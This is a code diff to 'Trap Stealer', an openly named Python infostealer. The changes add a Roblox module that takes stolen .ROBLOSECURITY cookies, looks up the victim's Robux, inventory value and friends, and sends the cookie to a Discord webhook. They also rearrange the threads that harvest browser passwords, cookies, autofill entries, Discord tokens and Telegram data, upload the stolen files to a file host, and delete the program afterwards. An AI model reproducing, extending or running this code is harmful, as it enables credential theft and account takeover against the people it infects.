@@ -528,7 +528,7 @@ def globalInfo():
         except Exception as e:
             gpu = f"An error occurred: {str(e)}"
 
-    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : {gpu} \nLatitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
+    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nProduct name : {pr}\n Windows Key `{winkey}`\n More Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU  : `{gpu}`\n`Latitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
     if len(globalinfo) > 1750:
         globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
         
@@ -553,8 +553,6 @@ def antispam():
             current_time = str(time.time())
             file.write(current_time)
 
-
-# ALL PATH
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
@@ -584,9 +582,9 @@ atfi = []
 
 
 def writeforfile(data, name):
-    path = os.path.join(os.getenv("TEMP"), f"wp{name}.txt")
-    with open(path, encoding='utf-8', newline='') as f:
-        f.write("Trap Stealer\n\n")
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"Trap Stealer\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -617,7 +615,7 @@ def getaut(path, arg):
                 atfi += 1
         writeforfile(atfi, 'autofill')
     except Exception as e:
-        pass
+        writeforfile(atfi, 'autofill')
 
 
 import requests
@@ -748,7 +746,7 @@ def checkTokq(Tokq):
     }
     try:
         a = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
-        if a.status_code == 401:  # Compare the status code as an integer
+        if a.status_code == 401: 
             return False
         else:
             return True
@@ -961,7 +959,7 @@ def upload_file(file_path):
             files={'file': open(file_path, 'rb')}
         )
         return response.json()["data"]["downloadPage"]
-    except:
+    except Exception as e:
         return False
     
     
@@ -1529,7 +1527,7 @@ def getwhatsapp(base_directory, zip_file_path):
 
         num_files = len(all_files)
 
-        if num_files <= 100:
+        if num_files <= 1000:
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for file_path in all_files:
                     zipf.write(file_path, os.path.relpath(file_path, base_directory))
@@ -1715,6 +1713,9 @@ def paaz():
         except:
             lines = 'error'
         
+        f = upload_file(file)
+        fd = upload_file(file2)
+        ft = upload_file(file3)
         pas = 'drowssaP'
         data = {
             "username": "Trap Stealer",
@@ -1726,9 +1727,9 @@ def paaz():
                     "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {atfiCount}",
                     "color": 0xffb6c1,
                     "fields": [
-                        {"name": f"{filename}", "value": f"[Click here to download]({upload_file(file)})"},
-                        {"name": f"{filename2}", "value": f"[Click here to download]({upload_file(file2)})"},
-                        {"name": f"{filename3}", "value": f"[Click here to download]({upload_file(file3)})"}  
+                        {"name": f"{filename}", "value": f"[Click here to download]({f})"},
+                        {"name": f"{filename2}", "value": f"[Click here to download]({fd})"},
+                        {"name": f"{filename3}", "value": f"[Click here to download]({ft})"}  
                     ],
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -1784,12 +1785,188 @@ def frcook():
                             Cookies.append(f"Host Key: {row[4]} | Name : {row[2]} | Value : {row[3]}")
                             CookiCount += 1
                             
-                    file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+                    file3 = os.getenv("TEMP") + f"\wpcook.txt"
                     with open(file3, 'a') as f:
                         f.write(Cookies)
                             
-    except: pass
+    except: 
+        pass
+
+def GetAll(UserID: int) -> list:
+    try:
+        FullList = []
+        response = requests.get(f'https://friends.roblox.com/v1/users/{UserID}/friends')
+        Friendslist = loads(response.text)
+
+        if 'data' in Friendslist:
+            x = 0
+            for friend in Friendslist['data']:
+                if x == 3:
+                    return FullList
+                
+                is_banned = friend.get('isBanned', False)
+                has_verified_badge = friend.get('hasVerifiedBadge', False)
+
+                banned_status = "❌" if is_banned == False else "✅"
+                verified_status = "❌" if has_verified_badge == False else "✅"
+
+                FullList.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))
+                x += 1
+            return FullList
+        else:
+            raise ValueError("No 'data' key in the response.")
+    except Exception as e:
+        return []
+
+def GetRAP(UserID):
+
+    ErroredRAP = 0
+    TotalValue = 0
+    Cursor = ""
+    Done = False
+    while(Done == False):
+        try:
+            response = requests.get(f"https://inventory.roblox.com/v1/users/{UserID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={Cursor}")
+            Items = response.json()
+            if((response.json()['nextPageCursor'] == "null") or response.json()['nextPageCursor'] == None):
+                Done = True
+            else:
+                Done = False
+                Cursor = response.json()['nextPageCursor']
+            for Item in Items["data"]:
+                try:
+                    RAP = int((Item['recentAveragePrice']))
+                    TotalValue = TotalValue + RAP
+                except:
+                    TotalValue = TotalValue
+            if(response.json()['nextPageCursor'] == 'None'):
+                Done = True
+            
+        except Exception as ex:
+            Done = True
+    return(TotalValue)
+
+def roblox(cookie):
+    try:
+        baseinf = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": cookie}).json()
+        username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
+        
+        friendlist = GetAll(userId)
+        rap = GetRAP(userId)
+        
+        if premium == True:
+            premium = '✅'
+        else:
+            premium = '❌'
+        if builderclub == True:
+            builderclub = '✅'
+        else:
+            premium = '❌'
+
+        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
+        description = 'No Description'
+        if advancedInfo["description"]:
+            description = advancedInfo["description"]
+        if advancedInfo["description"] == True:
+            banned = '✅'
+        else: 
+            banned = '❌'
+        creationDate = advancedInfo["created"]
+        creationDate = creationDate.split("T")[0].split("-")
+        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
+        creation_timestamp = time.mktime(time.strptime(creationDate, "%m/%d/%Y"))
+        current_timestamp = time.time()
+        seconds_passed = current_timestamp - creation_timestamp
+        days_passed = round(seconds_passed / (24 * 60 * 60))
+
+        data = {
+            "username": "Trap Stealer",
+            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "content": "",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer Roblox",
+                    "description": f"Cookie Founded ! : `{cookie}`\n",
+                    "color": 0xffb6c1,
+                    "author": {
+                        "name": f"{username} ({userId})\n",
+                    },
+                    "footer": {
+                        "text": "Trap Stealer",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    },
+                    "thumbnail": {
+                        "url": thumbnail 
+                    },
+                    "fields": [
+
+                        {
+                            "name": "💸 Robux:",
+                            "value": robux,
+                            "inline": True
+                        },
+                        {
+                            "name": ":ribbon: Premium:",
+                            "value": premium,
+                            "inline": True
+                        },
+                        {
+                            "name": "📅 Creation Date:",
+                            "value": creationDate+ f"\n{days_passed} Days!",
+                            "inline": True
+                        },
+                        {
+                            "name": "😋 Account Description:",
+                            "value": description,
+                            "inline": True
+                        },
+                        {
+                            "name": "🔨 Banned:",
+                            "value": banned,
+                            "inline": True
+                        },
+                        {
+                            "name": "💰 RAP:",
+                            "value": rap,
+                            "inline": True
+                        },
+                        {
+                            "name": "🔨 Friends:",
+                            "value": "\n".join([f"Display Name: `{friend_info[0]}`(Name: `{friend_info[1]}`)\nBanned:{friend_info[2]},Verified:{friend_info[3]}" for friend_info in friendlist]),
+                            "inline": True
+                        }
+                    ],
+                }
+            ],
+            "attachments": []
+        }
+        headers= {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        
+        character_limit = 1900
+
+        if len(data) > character_limit:
+            data = data[:character_limit - 3] + "..."
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:
+        pass
     
+def cokssite():
+    try:
+        coks = os.getenv("TEMP") + f"\wpcook.txt"
+        with open(coks, 'r') as f:
+            lines = f.readlines()
+            for line in lines:
+                if '.ROBLOSECURITY' in line:
+                    parts = line.split()
+                    cookie = parts[2]
+                    roblox(cookie)
+    except:
+        pass
+                
 def getCook(path, arg):
     try:
         global Cookies, CookiCount
@@ -1934,6 +2111,18 @@ def gatha():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
+    if Fakegen == True:
+        us = threading.Thread(target=fakegen)
+        us.start()
+        aa.append(us)
+    else:
+        pass
+    if FakeWebhook == True:
+        wb = threading.Thread(target=webhook_tools)
+        wb.start()
+        aa.append(wb)
+        
+    co = []
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
@@ -1944,8 +2133,33 @@ def gatha():
     except:
         pass
     
-    for thread in aa:
-        thread.join()
+    for patt in browserPaths:
+        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        pa.start()
+        co.append(pa)
+        
+    for patt in browserPaths: 
+        getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
+        getc.start()
+        co.append(getc)
+        
+        
+    for patt in browserPaths:
+        autof = threading.Thread(target=getaut,args=[patt[0], patt[3]])
+        autof.start()
+        co.append(autof)
+        
+    frfc = threading.Thread(target=frcook)
+    frfc.start()
+    co.append(frfc)
+        
+    for patt in browserPaths:
+        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
+        tokq.start()
+        co.append(tokq)
+        
+        
+    
     
     if hidewindow == True:
         try:
@@ -1958,6 +2172,7 @@ def gatha():
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
+    
     
     if OneTimeSteal == True:
         ots = threading.Thread(target=antispam)
@@ -1972,47 +2187,10 @@ def gatha():
         pass
 
         
-    for patt in browserPaths:
-        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
-        pa.start()
-        aa.append(pa)
-        
-    for patt in browserPaths: 
-        getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
-        getc.start()
-        aa.append(getc)
-        
-        
-    for patt in browserPaths:
-        autof = threading.Thread(target=getaut,args=[patt[0], patt[3]])
-        autof.start()
-        aa.append(autof)
-        
-    frfc = threading.Thread(target=frcook)
-    frfc.start()
-    aa.append(frfc)
-        
-    for patt in browserPaths:
-        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
-        tokq.start()
-        aa.append(tokq)
-        
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
     aa.append(gatz)
-        
-    for patt in discordPaths:
-        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        di.start()
-        aa.append(di)
-
     
-    for thread in aa:
-        thread.join()
-        
-    paaz_thread = threading.Thread(target=paaz)
-    paaz_thread.start()
-    aa.append(paaz_thread)
     upfd = threading.Thread(target=upload_files_to_discord)
     upfd.start()
     aa.append(upfd)
@@ -2025,15 +2203,9 @@ def gatha():
     uploadw.start()
     aa.append(uploadw)
     
-    
-    
     scr = threading.Thread(target=srcs)
     scr.start()
     aa.append(scr)
-    
-    for thread in aa:
-        thread.join()
-
     
     if injection == True:
         try:
@@ -2056,23 +2228,29 @@ def gatha():
             pass
     except:
         pass
+    
+    for patt in discordPaths:
+        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        di.start()
+        aa.append(di)
+
+    
+    for thread in co:
+        thread.join()
+
+    paaz_thread = threading.Thread(target=paaz)
+    paaz_thread.start()
+    aa.append(paaz_thread)
+    
+    rbx = threading.Thread(target=cokssite)
+    rbx.start()
+    aa.append(rbx)
+    
+    
     for thread in aa:
         thread.join()
-    
-    if Fakegen == True:
-        us = threading.Thread(target=fakegen)
-        us.start()
-        aa.append(us)
-    else:
-        pass
-    if FakeWebhook == True:
-        wb = threading.Thread(target=webhook_tools)
-        wb.start()
-        aa.append(wb)
-    
-    e = []
-    for thread in e:
-        thread.join()
+
+
     for thread in aa:
         thread.join()
         
@@ -2080,7 +2258,7 @@ def gatha():
         crashs()
         
     if melter != False:
-        srcs = os.path.realpath(__file__)
-        dlself(srcs)
+        srcss = os.path.realpath(__file__)
+        dlself(srcss)
 
 gatha()
